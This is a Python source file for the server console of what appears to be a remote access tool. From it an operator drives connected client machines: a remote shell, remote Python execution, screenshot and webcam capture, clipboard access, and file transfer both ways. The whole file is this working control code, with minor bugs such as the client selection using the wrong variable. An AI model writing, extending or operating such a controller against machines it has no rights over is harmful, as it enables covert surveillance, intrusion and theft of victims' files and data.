import os
import socket
import platform
import logging
from datetime import datetime

from cryptography import x509
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives import padding, serialization

from modules.clients import Client
from modules.baseserver import BaseServer
from utils.prompts import increase_timeout_prompt

if platform.system() != 'Windows':
    # Enables using arrowkeys on unix-like systems
    try:
        import readline
    except ImportError:
        pass

logging.basicConfig(level=logging.DEBUG)
socket.setdefaulttimeout(10)

# Padding for AES
pad = padding.PKCS7(256)
header_length = 8

BLOCK_SIZE = 32768

menu_help = """
Commands:

list
open (ID)
shutdown
help
"""

interact_help = """
Available commands:

shell
python
screenshot
webcam
copy
paste
receive
send
exit/back
"""


class ServerCLI(BaseServer):
    """ CLI for BaseServer """

    def __init__(self, certificate: x509.Certificate, private_key: ec.EllipticCurvePrivateKey):
        super().__init__(certificate, private_key)

    def cli(self) -> None:
        """ Start CLI """
        while True:
            try:
                self.menu()
            except KeyboardInterrupt:
                print('Ctrl-C detected: Shutting down server')
                self.shutdown()
                break
            except Exception as error:
                logging.critical('Critical errors occurred: %s' % str(error))

    def menu(self) -> None:
        """ Menu for interacting with clients """
        while True:
            command, *args = input('> ').split()

            match command:
                case 'help':
                    print(menu_help)
                case 'open':
                    try:
                        self.select(args)
                    except KeyboardInterrupt:
                        # Quit selector when ctrl-c is detected
                        print()
                        continue
                    except Exception as error:
                        logging.error('Client experiened an error: %s' % str(error))
                        continue
                case 'list':
                    self.list_cli()
                case 'shutdown':
                    raise KeyboardInterrupt
                case _:
                    print('Command was not recognized, type "help" for help.')

    def select(self, *args) -> None:
        """ Interact with a client """
        selected_client = None
        argument = args[0]

        if not argument:
            print('No client ID was given')
            return

        # Create a copy of the clients list
        # This ensures the list is looped through entirely
        # as some items may be otherwise removed mid loop
        clients = self.clients.copy()

        # Check if the given id matches a client.id
        for client in clients:
            if client.id == argument[0]:
                selected_client = client

        if selected_client is None:
            print('Invalid client ID')
            return

        while True:
            try:
                if self.interact(client):
                    break
            except KeyboardInterrupt:
                print('Ctrl-C detected: Returning to menu')
                break

    def interact(self, client: Client) -> None:
        """ Interact with a client """
        command, *args = input(f'{client.address[0]}> ').split()
        match command:
            case 'help':
                print(interact_help)
            case 'exit' | 'back':
                return True
            case 'shell':
                self.shell_cli(client)
            case 'python':
                self.python_cli(client)
            case 'screenshot':
                self.screenshot(client)
            case 'webcam':
                self.webcam(client)
            case 'copy':
                self.copy(client)
            case 'paste':
                self.paste(client)
            case 'receive':
                self.receive_file(client)
            case 'send':
                self.send_file(client)
            case _:
                print('Command was not recognized, type "help" for help.')

    def list_cli(self):
        """ CLI for list """
        clients = self.list()
        for client in clients:
            print(f'ID: {client.id} / Address: {client.address}')

    def shell_cli(self, client: Client) -> None:
        """ Open a shell to client """
        logging.debug('Launched shell (%s)' % client.id)
        while True:
            command = input('shell> ')

            # Check for cases where command only affects output visually
            match command.strip():
                case 'exit':
                    break
                case 'clear' | 'cls':
                    if platform.system() == 'Windows':
                        os.system('cls')
                    else:
                        os.system('clear')
                    continue

            # Check if the directory is changed, in which case it should be remembered
            comm, *_ = command.split()
            if comm.lower() in ['cd', 'chdir']:

                print(client.shell(command).decode(), end='')
                # TODO: update cwd accordingly

            # Increase timeout to 60 seconds for shell
            client.conn.settimeout(60)
            try:
                print(client.shell(command).decode(), end='')
            except TimeoutError:
                logging.info('Shell command timed out: %s' % client.id)
                # Prompt user if they want to increase the timeout limit
                if increase_timeout_prompt():
                    # Indefinitely block for output
                    client.conn.settimeout(None)
                    print(client.read().decode(), end='')
            finally:
                # Set timeout back to default
                client.conn.settimeout(socket.getdefaulttimeout())

    def python_cli(self, client: Client) -> None:
        """ Open a python interpreter to client """
        logging.debug('Launched python interpreter (%s)' % client.id)
        while True:
            command = input('>>> ')

            if command.strip().lower() in ['exit', 'exit()']:
                break

            # Increase timeout to 60 seconds for python interpreter
            client.conn.settimeout(60)
            try:
                print(client.python(command).decode(), end='')
            except TimeoutError:
                logging.info('Python command timed out: %s' % client.id)
                # Prompt user if they want to increase the timeout limit
                if increase_timeout_prompt():
                    # Indefinitely block for output
                    client.conn.settimeout(None)
                    print(client.read().decode(), end='')
            finally:
                client.conn.settimeout(socket.getdefaulttimeout())

    def screenshot(self, client: Client) -> None:
        """ Take a screenshot and save it in a file """
        logging.debug('Taking screenshot (%s)' % client.id)
        client.write(b'SCREENSHOT')
        client.conn.settimeout(120)
        try:
            img_data = client.read()
        finally:
            client.conn.settimeout(socket.getdefaulttimeout())

        if img_data.startswith(b'ERROR'):
            logging.error('Error taking screenshot (%s): %s' % (client.id, img_data.decode()))
            print(f'Error taking screenshot: {img_data.decode()}')
            return

        file_name = 'screenshot-' + str(datetime.now()).replace(':', '-') + '.png'
        with open(file_name, 'wb') as file:
            file.write(img_data)
        logging.info('Saved screenshot at (%s): %s' % (client.id, file_name))
        print(f'Saved screenshot: {file_name}')

    def webcam(self, client: Client) -> None:
        """ Capture webcam """
        logging.debug('Capturing webcam (%s)' % client.id)
        client.write(b'WEBCAM')
        client.conn.settimeout(120)
        try:
            img_data = client.read()
        finally:
            client.conn.settimeout(socket.getdefaulttimeout())

        if img_data == b'ERROR':
            logging.error('Unable to capture webcam (%s)' % client.id)
            print('Unable to capture webcam')
            return

        file_name = 'webcam-' + str(datetime.now()).replace(':', '-') + '.png'
        with open(file_name, 'wb') as file:
            file.write(img_data)
        logging.info('Saved webcam capture at (%s): %s' % (client.id, file_name))
        print(f'Saved webcam capture: {file_name}')

    def copy(self, client: Client) -> None:
        """ Copy to client clipboard """
        logging.debug('Copying to client clipboard (%s)' % client.id)
        data = input('Text to copy: ')
        client.write(b'COPY')
        client.write(data.encode())
        if client.read() == b'ERROR':
            error = client.read().decode()
            logging.error('Error copying to client clipboard (%s): %s' % (client.id, error))
            print(f'Error copying to client clipboard: {error}')
        else:
            logging.info('Copied "%s" to client clipboard (%s)' % (data, client.id))
            print('Copied to clipboard successfully')

    def paste(self, client: Client) -> None:
        """ Paste from clipboard """
        logging.debug('Pasting from client clipboard')
        client.write(b'PASTE')
        clipboard = client.read().decode()
        if clipboard == 'ERROR':
            error = client.read().decode()
            logging.error('Error pasting from clipboard (%s): %s' % (client.id, error))
            print(f'Error pasting from clipboard: {error}')
        else:
            logging.info('Pasted "%s" from client clipboard (%s)' % (clipboard, client.id))
            print(f'Clipboard:\n{clipboard}')

    def receive_file(self, client: Client) -> None:
        """ Receive a file from the client """
        filename = input('File to transfer: ')
        save_name = input('Save file as: ')
        logging.debug('Receiving file "%s" from client (%s)' % (filename, client.id))
        client.write(b'SEND_FILE')
        client.write(filename.encode())

        with open(save_name, 'wb') as file:
            while True:
                data = client.read()
                if data == b'ERROR':
                    logging.info('Client encountered error transferring file "%s" (%s)' % (filename, client.id))
                    print('Client encountered error transfering file: ' + client.read().decode())
                    break
                if data == b'FILE_TRANSFER_DONE':
                    break
                file.write(data)

    def send_file(self, client: Client) -> None:
        """ Send a file to client """
        filename = input('Filename: ')
        save_name = input('Save file as: ')
        logging.debug('Sending file "%s" to client (%s)' % (filename, client.id))

        client.write(b'RECEIVE_FILE')
        client.write(save_name.encode())
        error = client.read().decode() == 'ERROR'
        if error:
            print('Error occurred sending file to client: ' + client.read().decode())
            return

        try:
            with open(filename, 'rb') as file:
                while True:
                    block = file.read(BLOCK_SIZE)
                    if not block:
                        break
                    client.write(block)

        except (FileNotFoundError, PermissionError) as error:
            logging.error('Unable to send file "%s" to client (%s): %s' % (filename, client.id, str(error)))
            client.write(b'FILE_TRANSFER_DONE')
        else:
            client.write(b'FILE_TRANSFER_DONE')
            logging.info('Successfully transferred file "%s" to client (%s)' % (filename, client.id))


if __name__ == '__main__':

    # Read certficate from file
    with open('cert.pem', 'rb') as file:
        cert = x509.load_pem_x509_certificate(file.read())

    # Read private key from file
    with open('key.pem', 'rb') as file:
        private_key = serialization.load_pem_private_key(file.read(), None)

    # Start server
    server = ServerCLI(cert, private_key)
    server.start(('localhost', 6969))

    # Get a client that connected
    client = server.connections_queue.get()
    print(client.id.encode())

    # Begin server CLI
    server.cli()
